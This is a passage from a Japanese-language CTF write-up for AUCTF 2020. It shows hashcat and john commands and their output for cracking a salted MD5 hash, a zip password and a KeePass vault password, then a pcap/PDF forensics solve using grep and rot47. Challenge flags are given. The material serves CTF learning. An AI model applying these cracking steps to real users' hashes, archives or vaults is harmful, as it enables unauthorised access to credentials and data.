>>> random.randint(0,128)
91
>>> random.randint(0,128)
55
>>> exit()
```


<br />

Flag: `103, 77, 122, 91, 55`



<br /><br />
<br /><br />
## [Password Cracking]: Salty
- - -
### Challenge
>You might need this: 1337
<br /><br />
Hash: 5eaff45e09bec5222a9cfa9502a4740d
<br /><br />
NOTE: The flag is NOT in the standard auctf{} format

<br />

### Solution
最初、以下みたいなサイトで解くやつかと思ったんですよね。

https://www.dcode.fr/md5-hash

<br />
その後、以下のファイルを作るところまではやったんですが、`john` で解こうとしてハマって終了。
<pre>
5eaff45e09bec5222a9cfa9502a4740d:1337
</pre>

<br /><br />
これは `hashcat` でやるのがよかったみたい。モードは以下のようにいくつかあります。

<pre>
$ hashcat --help | grep salt | grep md5
     10 | md5($pass.$salt)                                 | Raw Hash, Salted and/or Iterated
     20 | md5($salt.$pass)                                 | Raw Hash, Salted and/or Iterated
     30 | md5(utf16le($pass).$salt)                        | Raw Hash, Salted and/or Iterated
     40 | md5($salt.utf16le($pass))                        | Raw Hash, Salted and/or Iterated
   3800 | md5($salt.$pass.$salt)                           | Raw Hash, Salted and/or Iterated
   3710 | md5($salt.md5($pass))                            | Raw Hash, Salted and/or Iterated
   4010 | md5($salt.md5($salt.$pass))                      | Raw Hash, Salted and/or Iterated
   4110 | md5($salt.md5($pass.$salt))                      | Raw Hash, Salted and/or Iterated
   3910 | md5(md5($pass).md5($salt))                       | Raw Hash, Salted and/or Iterated
</pre>

<br />

<pre>
$ hashcat -m 20 -a 0 salty.txt /usr/share/wordlists/rockyou.txt --force
hashcat (v5.1.0) starting...

:

5eaff45e09bec5222a9cfa9502a4740d:1337:treetop
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Type........: md5($salt.$pass)
Hash.Target......: 5eaff45e09bec5222a9cfa9502a4740d:1337
Time.Started.....: Sat Apr 11 12:55:08 2020 (1 sec)
Time.Estimated...: Sat Apr 11 12:55:09 2020 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   150.5 kH/s (0.44ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.........: 28672/14344385 (0.20%)
Rejected.........: 0/28672 (0.00%)
Restore.Point....: 26624/14344385 (0.19%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: 200390 -> spongebob9
</pre>

<br />

Flag: `treetop`




<br /><br />
<br /><br />
## [Password Cracking]: Zippy
- - -
### Challenge
>Have fun!
<br /><br />
NOTE: The flag is NOT in the standard auctf{} format

Attachment:

- zippy.zip


<br />

### Solution
まずは、ダメだった例から。

<pre>
$ zip2john zippy.zip > hash.txt
ver 81.9 zippy.zip/unzipme.zip is not encrypted, or stored with non-handled compression type

$ fcrackzip -v -D -u -p /usr/share/wordlists/rockyou.txt zippy.zip 
found file 'unzipme.zip', (size cp/uc    871/   908, flags 1, chk 0000)
</pre>

というか、zip2john自体はあってたっぽいけど、なんか失敗してるのかと思って、fcrackzipをやって解けなかったので諦めたやつでした。

<br />

今日 `john` でやってみたら普通にできたし。（11分かかりました）
<pre>
$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 128/128 AVX 4x])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
8297018229       (zippy.zip/unzipme.zip)
1g 0:00:11:47 DONE (2020-04-11 13:48) 0.001413g/s 16660p/s 16660c/s 16660C/s 82973..828298
Use the "--show" option to display all of the cracked passwords reliably
Session completed
</pre>


<br />
ちなみに、`hashcat` でもやってみました。（こっちは24分くらいかかりました）

<pre>
$ hashcat -h | grep -i zip
  11600 | 7-Zip                                            | Archives
  13600 | WinZip                                           | Archives

$ cat hash.txt | cut -d: -f2 > hash2.txt

$ hashcat -m 11600 -a 0 hash2.txt /usr/share/wordlists/rockyou.txt --force
hashcat (v5.1.0) starting...

:

$zip2$*0*1*0*c08d7c0b232de6b3*f4fd*353*0cf6d3cf3ecc646b5ecf1a50f2396eef083c29c
:
080e2c2396c6fa1dcecc5e9edf17475c78f308*7129395cf8dd47ce280f*$/zip2$:8297018229

Session..........: hashcat
Status...........: Cracked
Hash.Type........: WinZip
Hash.Target......: $zip2$*0*1*0*c08d7c0b232de6b3*f4fd*353*0cf6d3cf3ecc.../zip2$
Time.Started.....: Sat Apr 11 13:09:39 2020 (24 mins, 57 secs)
Time.Estimated...: Sat Apr 11 13:34:36 2020 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:     7764 H/s (6.00ms) @ Accel:256 Loops:124 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.........: 11785216/14344385 (82.16%)
Rejected.........: 0/11785216 (0.00%)
Restore.Point....: 11784704/14344385 (82.16%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:992-999
Candidates.#1....: 829802 - 8294584221
</pre>

この先にもまだZipファイルが出てくるんですが、これ以上はやってません。


<br /><br />
<br /><br />
## [Password Cracking]: Manager
- - -
### Challenge
>There might be a flag inside this file. The password is all digits.
<br /><br />
NOTE: The flag is NOT in the standard auctf{} format

Attachment:

- manager.kdbx


<br />

### Solution

いちおう、以下はやったんです。
<pre>
$ keepass2john manager.kdbx > hash.txt
$ john --incremental=digits hash.txt 
</pre>

でも、1時間半やっても終わらなかったので、強制終了して諦めたやつでした。。。

<br />
他の方のWriteupとか見てると、3時間くらいかかるっぽいですね。せっかちなんで、そんなに待っていられないです。

あと、もしかしたら、以下のようにフォーマットを指定した方がよかったかもです。
<pre>
$ john --format:keepass --incremental=digits hash.txt
</pre>

<br /><br />
いちおう `hashcat`で、フラグが6桁なのがわかっている前提でやってみました。（1時間弱かかりました）

<pre>
$ hashcat -h | grep -i keepass
  13400 | KeePass 1 (AES/Twofish) and KeePass 2 (AES)      | Password Managers

$ hashcat -a 3 -m 13400 keepass_hash.txt '?d?d?d?d?d?d' --force
:
$keepass$*2*60000*0*f31bf71589af9d69d3a9d58b97755405de93aedfbefe244129bb5ac64ed8af41*2f0e592de948bbc65eb9738af2daca231ae54c851ceb1e98f16a69e8f5f48336*8a868c9aedf169c857a8734188bba8eb*8f12fb161ef9e102ef805b84f5ee733c2a645b71099cbf8dab1ed750c58756ee*34fe5cf5eb7991a826a71c3330f88ce9c5ed7cf0e041e4e50a24110d2a69cdd7:157865
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Type........: KeePass 1 (AES/Twofish) and KeePass 2 (AES)
Hash.Target......: $keepass$*2*60000*0*f31bf71589af9d69d3a9d58b9775540...69cdd7
Time.Started.....: Sat Apr 11 14:01:15 2020 (56 mins, 2 secs)
Time.Estimated...: Sat Apr 11 14:57:17 2020 (0 secs)
Guess.Mask.......: ?d?d?d?d?d?d [6]
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:      113 H/s (8.69ms) @ Accel:256 Loops:128 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.........: 379392/1000000 (37.94%)
Rejected.........: 0/379392 (0.00%)
Restore.Point....: 37888/100000 (37.89%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:59904-60000
Candidates.#1....: 168432 -> 176865
</pre>

<br />
もしかしたら、`-w`オプションを付けたらもっと早く終わるのかも知れないですけど、試してないです。

以下、helpより。

<pre>
- [ Workload Profiles ] -

  # | Performance | Runtime | Power Consumption | Desktop Impact
 ===+=============+=========+===================+=================
  1 | Low         |   2 ms  | Low               | Minimal
  2 | Default     |  12 ms  | Economic          | Noticeable
  3 | High        |  96 ms  | High              | Unresponsive
  4 | Nightmare   | 480 ms  | Insane            | Headless
</pre>


<br />
ここで取れた Master Password (157865) を使って、WindowsのKeePassツールで開くとフラグが取れました。


Flag: `y0u4r34r34lh4ck3rn0w#!$1678`


<br /><br />
<br /><br />
## [Forensics]: Fahrenheit 451
- - -
### Challenge
>Your SUBSTITUTE teacher accessed his copy of Fahrenheit 451 over his windows network share. Can you find the flag your friend hid in the book?
<br /><br />
Standard Flag Format auctf{}

Attachment:

- f451.pcapng


<br />

### Solution
Pcapから、Fahrenheit_451_Full_Text.pdf を取り出すところまでは、すんなりいけます。

<br />
PDFは72ページあります。ハイライトもやってみたんですが、ページ数が多くて怪しい箇所を見つけるまでの根気がなくて諦めたやつです。

他の方のWriteupを参照すると、上から眺めていけば8ページ目辺りで見つかったらしいです。

そんなんだったら、72ページじゃなくて、せめて10ページくらいのファイルにしてくれてもいいのに。。。



<br /><br />
ま、そんな文句を言っても仕方ないので、目視以外のやり方で、どうやったら大量のテキストの中から怪しい文字列を見つけられたか、考えてみました。

まずは、テキストを全部取り出します。
<pre>
$ pdftotext Fahrenheit_451_Full_Text.pdf
</pre>

<br />
案1：スペリングがおかしい単語を全部出してみるとか。
<pre>
$ cat Fahrenheit_451_Full_Text.txt | aspell list | sort | uniq
</pre>
==> これはダメでした。フラグの箇所がそもそも単語とみなされないため。

<br />
案2：10文字以上の単語を全部出してみるとか。
<pre>
$ cat Fahrenheit_451_Full_Text.txt | grep -o -w '\w\{10,\}' | sort | uniq
</pre>
==> これもダメでした。前述のと同じ理由で、フラグの箇所がそもそも単語とみなされないため。

<br />
案3：以下は、空白文字以外の文字が15個以上連続しているものの検索です。これでいけました。

{{< highlight sh "linenos=table,hl_lines=8" >}}
$ cat Fahrenheit_451_Full_Text.txt | grep -o '\S\{15,\}'
black-beetle-coloured
two-hundred-foot-long
mosquito-delicate
sleeping-tablets
contra-sedative
sleeping-tablets,
2F4E7L3FC?0E9603@@<DPP`PN
:
{{< / highlight >}}

<br />
あとは、SUBSTITUTEということで、rotをいろいろ試すだけです。（rot47でした）

<br />
Flag: `auctf{burn_the_books!!1!}`






<br /><br />
<br /><br />
- - -
<br /><br />
<br /><br />

